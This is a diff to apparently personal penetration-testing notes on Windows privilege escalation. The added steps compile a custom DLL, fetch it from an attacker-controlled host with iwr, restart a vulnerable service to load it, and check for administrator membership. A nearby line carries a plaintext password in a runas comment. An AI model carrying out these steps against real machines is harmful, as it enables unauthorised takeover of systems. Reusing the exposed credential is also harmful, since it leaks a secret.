@@ -68,6 +68,14 @@ When you gain access to a windows user do steps bellow:
       icacls .\Documents\BetaServ.exe # to confirm that we don't have permission to change binario, if you have go to #Service Binary hijacking
       # get and start procmon64.exe (sysinternals suite), identify missing DLL on changeable paths
       $env:path
+      #Dowload, adjust and compile myDLL.cpp, it'a important remembering that compilade DLL name must be exactly same to enumerate vulberable DLL 
+      cd Documents
+      x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll
+      iwr -uri http://192.168.119.3/myDLL.dll -Outfile myDLL.dll
+      Restart-Service BetaService
+      net user
+      net localgroup administrators
+      
       
 
 runas /user:"richmond" "powershell -ep bypass"   # GothicLifeStyle1337!
